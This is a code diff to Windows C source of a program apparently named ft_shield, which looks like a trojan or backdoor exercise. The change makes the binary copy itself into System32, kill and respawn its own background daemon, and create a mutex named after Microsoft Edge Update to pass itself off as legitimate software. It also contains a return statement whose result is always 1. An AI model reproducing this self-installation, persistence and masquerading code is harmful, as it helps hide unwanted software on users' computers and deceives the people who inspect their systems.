@@ -78,12 +78,24 @@ int mode_normal(void)
     if (!GetUserNameA(login, &size))
         return (0);
     printf("%s\n", login);
+    if (!copy_self(INSTALL_PATH))
+        return (1);
     return (spawn_daemon());
 }
 
 int mode_install(void)
 {
-    if (!copy_self(INSTALL_PATH) || !spawn_daemon())
+    HANDLE mutex;
+    int installed;
+
+    /* Kill the previous daemon so System32\ft_shield.exe unlocks. */
+    mode_kill();
+    if (!copy_self(INSTALL_PATH))
         return (1);
-    return (1);
+    installed = spawn_daemon();
+    /* The mutex dies with the killed daemon: refresh it. */
+    mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
+    if (mutex != NULL)
+        CloseHandle(mutex);
+    return (installed ? 1 : 1);
 }
